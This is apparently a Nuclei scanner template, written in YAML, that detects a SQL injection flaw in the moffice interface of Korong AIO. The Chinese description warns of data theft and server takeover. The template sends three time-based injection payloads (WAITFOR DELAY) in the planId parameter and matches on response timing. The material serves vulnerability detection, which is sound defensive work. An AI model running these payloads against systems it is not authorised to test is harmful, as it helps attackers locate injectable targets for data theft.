id: krAIO-planId-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 科荣AIO moffice 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://github.com/wy876/POC/blob/83e10239b38217f344aacc70d4aa47d8f16d0076/%E7%A7%91%E8%8D%A3AIO-moffice%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - method: GET
    path:
      - "{{BaseURL}}/moffice?op=showWorkPlan&planId=1';WAITFOR+DELAY+'0:0:3'--&sid=1"
      - "{{BaseURL}}/moffice?op=showWorkPlan&planId=1';WAITFOR+DELAY+'0:0:6'--&sid=1"
      - "{{BaseURL}}/moffice?op=showWorkPlan&planId=1';WAITFOR+DELAY+'0:0:9'--&sid=1"
      
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"
